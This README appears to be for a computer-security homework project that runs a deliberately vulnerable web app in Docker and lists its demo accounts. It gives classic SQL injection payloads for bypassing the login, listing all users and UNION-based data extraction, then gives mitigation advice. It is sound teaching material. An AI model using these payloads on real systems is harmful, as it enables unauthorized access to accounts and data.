# SQL Injection Demo

This project demonstrates SQL injection vulnerabilities for educational purposes (CSC435 - Computer Security homework).

## Setup

1. Make sure you have Docker and Docker Compose installed
2. Clone this repository
3. Run `docker-compose up --build`
4. Access the web application at <http://localhost:8080>

## Sample Users

The following users are pre-configured in the database:

| Username | Password    |
|----------|-------------|
| johnd    | password123 |
| janes    | smith2022   |
| admin    | admin123    |
| bobj     | support2023 |

## Demonstrating SQL Injection

This application is intentionally vulnerable to SQL injection. Here are some example attacks:

1. Bypass authentication:
   - Username: `admin' -- ` (note the space after --)
   - Password: `anything`
   
   Alternative method:
   - Username: `admin'#`
   - Password: `anything`

2. Display all users:
   - Username: `' OR '1'='1`
   - Password: `' OR '1'='1`

3. Extract data from other tables:
   - Username: `' UNION SELECT 1,2,3,4,5 -- ` (note the space after --)
   - Password: `anything`
   
   Alternative method:
   - Username: `' UNION SELECT 1,2,3,4,5#`
   - Password: `anything`

## Creating a Safe Version

To create a secure version of this application, you would need to:

1. Use parameterized queries or prepared statements instead of string concatenation
2. Implement proper input validation
3. Follow the principle of least privilege for database access

A secure branch will be created in this repository with these improvements implemented.
